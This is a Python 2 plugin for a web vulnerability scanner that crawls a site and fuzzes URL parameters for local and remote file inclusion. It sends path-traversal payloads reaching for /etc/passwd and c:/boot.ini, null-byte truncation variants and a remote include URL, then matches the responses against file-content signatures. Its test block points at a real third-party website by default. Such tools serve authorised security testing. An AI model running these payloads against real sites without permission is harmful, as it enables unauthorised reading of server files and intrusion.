#!/usr/bin/python2.7
#coding:utf-8

import re
import urlparse
import urllib
import requests
import os
from dummy import *

info = {
	'NAME':'Local/Remote File Inclusion',
	'AUTHOR':'zero,yangbh',
	'TIME':'20140731',
	'WEB':'https://www.yascanner.com/#!/n/65'
}
# ----------------------------------------------------------------------------------------------------
#	速度太慢，需要修改
# ----------------------------------------------------------------------------------------------------
# 获取所有链接
def getCrawlerHrefs(url):
	''' '''
	try:
		cf = CrawlerFile(url=url)
		urls = cf.getSection('Hrefs')
		return urls
	except Exception,e:
		print 'Exception:\t',e
		return [url]

# 远程文件包含的FUZZ函数
def check_rfi(action, query, k, v, normal_res):
	# 要判断两次，第一次，传全参数列表进去，第二次，只FUZZ一个参数，其它参数不传
	for i in range(2):
		# 网上总结的一组经典列表，以(路径，签名)做列表
		paths = [
				('../../../../../../../../../../etc/passwd', '/bin/(bash|sh)[^\r\n<>]*[\r\n]'),
				('../../../../../../../../../../etc/passwd?', '/bin/(bash|sh)[^\r\n<>]*[\r\n]'),
				('../../../../../../../../../../etc/passwd%00', '/bin/(bash|sh)[^\r\n<>]*[\r\n]'),
				('../../../../../../../../../../etc/passwd%2500', '/bin/(bash|sh)[^\r\n<>]*[\r\n]'),
				('http://cirt.net/rfiinc.txt?', '<title>phpinfo'),
				('c:/boot.ini', '\[boot loader\][^\r\n<>]*[\r\n]'),
				]
		for inj, fingerprint in paths:
			qsl = []
			# 第一轮fuzz，完整提交全部参数
			if i == 0:
				for key, val in query:
					# 如果参数key为要fuzz的，替换为路径
					val = inj if (key==k) else val
					qsl.append((key, val))
			else:
				# 第二轮fuzz, 只提交要fuzz的参数，其它不提交
				qsl.append((k, inj))

			
			# urlencode会顺带queto url string，干扰截断
			# 截断能用urlencode吗？encode之后不就截断不了啦
			# 经合成URL
			qs = urllib.urlencode(qsl)
			
			qs = urllib.unquote(qs)
			url = '%s?%s' % (action, qs)
			print 'url=\t',url
			# # 发送请求
			# code, head, res, _, _ = curl.curl(url)
			# debug('[%03d] %s', code, url)
			# # 开始查询是否包含签名内容, 如<?php <%
			# # 如果指定的签名在fuzz过程中找到，而没有在正常的网页里找到，说明漏洞存在
			# if re.search(fingerprint, res) and (not re.search(fingerprint, normal_res)):
			# 	# 记录一个报告
			# 	security_warning(url)
			# 	# 中断fuzz
			# 	return True
			# ----------------------------------------------------------------------------------
			# modifiedy by yangbh
			# 
			try:
				respone = requests.get(url)
				res = respone.text
				if re.search(fingerprint, res) and (not re.search(fingerprint, normal_res)):
					# 记录一个报告
					# security_warning(url)
					# 中断fuzz
					return url
			except Exception,e:
				print 'Exception:\t',e

	return False

# 本地文件包含的fuzz函数
def check_lfi(action, query, k, v, files, suffix, flags):
	filter = {}
	# 默认情况下，只测试两轮，像远程文件包含一样
	loop = 2
	# 如果参数有文件后缀，测试三轮，第三轮测试文件后缀截断漏洞(附加%00)
	if suffix:
		loop = 3
	# 开始fuzz
	for i in range(loop):
		for file in files:
			# 如果是第三轮，循环以0开头(0,1,2), 在后缀后加上\x00测试是否有文件名截断漏洞
			if i == 2:
				file += '\x00.' + suffix
			# 构造查询结构
			qsl = []
			# 第一轮，提交全部参数
			if i == 0:
				for key, val in query:
					val = file if (key==k) else val
					qsl.append((key, val))
			# 第二轮，只提交FUZZ的参数
			else:
				# next loop only test one argments
				qsl.append((k, file))

			# 构造URL
			qs = urllib.urlencode(qsl)
			url = '%s?%s' % (action, qs)
			print 'url=\t',url
			# 这里加了一个过滤器，防止产生重复的URL
			if url not in filter:
				filter[url] = True
				# 请求URL
				# ----------------------------------------------------------------------------------
				# modifiedy by yangbh
				# 
				# code, head, res, _, new_url = curl.curl(url)
				# debug('[%03d] %s', code, url)
				# # 开始查询是否包含签名内容, 如<?php <%
				# for w in flags:
				# 	if re.search(w, res):
				# 		# 发现漏洞，上传报告，并返回
				# 		security_warning(url)
				# 		return True

				try:
					respone = requests.get(url)
					res = respone.text
					for w in flags:
						if re.search(w, res):
							# 发现漏洞，上传报告，并返回
							return url
				except Exception,e:
					print 'Exception:\t',e

	return False

def Audit(services):
	retinfo = {}
	output = ''
	if services.has_key('url') and False:
		output += 'plugin run' + os.linesep
		url = services['url']
		hrefs = getCrawlerHrefs(url)
		pprint(hrefs)
		try:
			# 尝试每个参数是否有远程文件包含漏洞
			for eachhref in hrefs:
				r = urlparse.urlparse(eachhref)
				# 取出?号前面的地址
				action = urlparse.urlunsplit((r.scheme, r.netloc, r.path, '', ''))
				# 取出参数的key
				pairs = urlparse.parse_qsl(r.query)
				# 以下参数，为.NET的内置参数，自动跳过，不判断
				reject_key = ['__VIEWSTATE', 'IbtnEnter.x', 'IbtnEnter.y']

				try:
					normal_res = requests.get(action).text
					# 尝试每个参数是否有远程文件包含漏洞
					for k, v in pairs:
						# 跳过指定的内置参数
						if k in reject_key:
							continue
						# 如果发现参数有漏洞，返回
						ret = check_rfi(action, pairs, k, v, normal_res)
						if ret:
							retinfo += ret + os.linesep
							security_warning(ret)
							return (retinfo,output)
				except Exception,e:
					print 'Exception:\t',e

				# 尝试每个参数是否有本地文件包含读取漏洞, 以当前文件名做为包含文件，传递
				# 获取当前URL的快照，搜索内容来获取有效的用来判断是否利用成功的签名，如:<?php, <%
			
				res = requests.get(eachhref).text
				# code, head, res, _, _ = curl.curl(url)
			
				flags = []
				for w in ['<\?[\r\n\s=]', '<\?php[\r\n\s=]', '<%[\r\n\s@]']:
					if not re.search(w, res):
						flags.append(w)
				# 没有找到可以使用的签名，返回
				if not flags:
					return (retinfo,output)

				paths = ['.', '..', '../..', '../../..', '../../../..', '../../../../..']
				files = []
				# 获取URL的文件名
				filename = r.path.split('/')[-1]

				# 保存到要fuzz的文件列表里
				files.append(filename)

				# 保存一组递归目录列表，如./a.php, ../a.php, ../../a.php
				for path in paths:
					files.append(path + '/' + filename)

				# 保存一组递归的完整文件列表如, /../news/show.php, /../../news/show.php
				for path in paths:
					files.append(path + r.path)

				# 开始遍历参数进行fuzz
				for k, v in pairs:
					# 跳过内置的参数
					if k in reject_key:
						continue
					# 如果参数值里面找到类似a.jpg这样文件名特征, 获取文件后缀到suffix里面去
					suffix = ''
					if v.find('.') != -1:
						suffix = v.split('.')[-1]
					# 开始fuzz本地文件包含漏洞
					# 
					ret = check_lfi(action, pairs, k, v, set(files), suffix, flags)
					if ret:
						retinfo += ret + os.linesep
						security_warning(ret)
						return (retinfo,output)
		except Exception,e:
			print 'Exception:\t',e
	return (retinfo,output)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
# 测试代码开始
if __name__ == '__main__':
	url='http://www.eguan.cn'
	if len(sys.argv) ==  2:
		url = sys.argv[1]
	services = {'url':url}
	pprint(Audit(services))
	pprint(services)